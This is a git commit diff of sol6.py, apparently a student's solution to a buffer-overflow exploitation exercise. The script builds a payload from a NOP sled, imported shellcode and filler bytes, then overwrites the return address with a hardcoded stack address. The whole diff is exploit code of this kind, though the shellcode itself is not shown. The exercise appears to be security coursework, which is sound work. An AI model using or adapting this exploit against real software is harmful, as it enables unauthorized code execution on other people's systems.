4e25681b47d2c66af9b749d36722b7c33ad86e93
jordynk <jordyn13470@gmail.com>
2024-04-03 20:28:28 +0000

    sol6

--- sol6.py
+++ sol6.py
@@ -4,8 +4,8 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write(b'\x90'*964)
+sys.stdout.buffer.write(b'\x90'*(1024-len(shellcode)))
 sys.stdout.buffer.write(shellcode)
-
+sys.stdout.buffer.write(b'A'*8)
 #padding = 1024 - 256 - len(shellcode)
 sys.stdout.buffer.write(0x7ffffff6acb8.to_bytes(8, "little"))
